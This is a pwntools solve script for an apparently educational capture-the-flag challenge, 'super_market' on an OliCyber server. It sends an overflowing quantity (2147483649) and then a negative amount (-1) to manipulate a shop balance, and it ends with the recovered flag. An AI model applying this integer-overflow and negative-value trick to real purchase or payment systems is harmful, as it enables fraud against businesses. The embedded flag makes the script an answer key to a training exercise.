from pwn import *

elf = ELF("super_market")
r = remote("market.challs.olicyber.it", 10005)

r.recvuntil("Saldo corrente: ")
log.info("saldo " + r.recvline().strip().decode())

r.sendlineafter("> ", "1")

r.sendlineafter("> ", "2147483649")
r.sendlineafter("Altro? (s/n):", "s")

r.recvuntil("Saldo corrente: ")
log.info("saldo " + r.recvline().strip().decode())
r.close()
r = remote("market.challs.olicyber.it", 10005)
r.sendlineafter("> ", "3")

r.sendlineafter("> ", "-1")

log.success(r.recvline())

# flag{n3gat1ve_am0unt_is_n0t_an_am0unt}
